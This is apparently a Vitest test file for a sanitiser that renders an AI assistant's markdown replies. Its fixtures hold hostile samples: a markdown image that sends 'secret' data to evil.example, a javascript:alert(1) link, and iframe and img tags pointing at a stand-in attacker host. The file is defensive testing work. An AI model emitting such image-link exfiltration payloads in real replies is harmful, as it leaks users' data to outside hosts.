import { describe, expect, it } from 'vitest'
import { renderAssistantMarkdown } from '../src/lib/assistant-markdown.js'

function parse(html: string): HTMLElement {
  const root = document.createElement('div')
  root.innerHTML = html
  return root
}

describe('renderAssistantMarkdown', () => {
  it('renders GFM', () => {
    const root = parse(renderAssistantMarkdown('**Bold** and a list:\n\n- one\n- two'))
    expect(root.querySelector('strong')?.textContent).toBe('Bold')
    expect(root.querySelectorAll('li')).toHaveLength(2)
  })

  it('removes markdown images, so nothing loads a URL on its own', () => {
    const root = parse(renderAssistantMarkdown('![x](https://evil.example/leak?data=secret)'))
    expect(root.querySelector('img')).toBeNull()
    expect(root.innerHTML).not.toContain('evil.example')
  })

  it('shows raw HTML as text instead of rendering it', () => {
    const html = renderAssistantMarkdown(
      '<iframe src="https://evil.example"></iframe>\n\n<img src="https://evil.example/a.png">',
    )
    const root = parse(html)
    expect(root.querySelector('iframe')).toBeNull()
    expect(root.querySelector('img')).toBeNull()
    expect(root.textContent).toContain('<iframe')
  })

  it('drops javascript: and data: links but keeps the link text', () => {
    const root = parse(
      renderAssistantMarkdown('[click](javascript:alert(1)) [data](data:text/html,x)'),
    )
    const links = [...root.querySelectorAll('a')]
    expect(links).toHaveLength(2)
    for (const link of links) expect(link.hasAttribute('href')).toBe(false)
    expect(root.textContent).toContain('click')
  })

  it('opens external links in a new tab without opener or referrer', () => {
    const root = parse(renderAssistantMarkdown('[docs](https://example.org/guide)'))
    const link = root.querySelector('a')
    expect(link?.getAttribute('href')).toBe('https://example.org/guide')
    expect(link?.getAttribute('target')).toBe('_blank')
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer')
  })

  it('keeps relative links in Studio as they are', () => {
    const root = parse(renderAssistantMarkdown('[about](/studio/site/pages/about)'))
    const link = root.querySelector('a')
    expect(link?.getAttribute('href')).toBe('/studio/site/pages/about')
    expect(link?.hasAttribute('target')).toBe(false)
  })
})
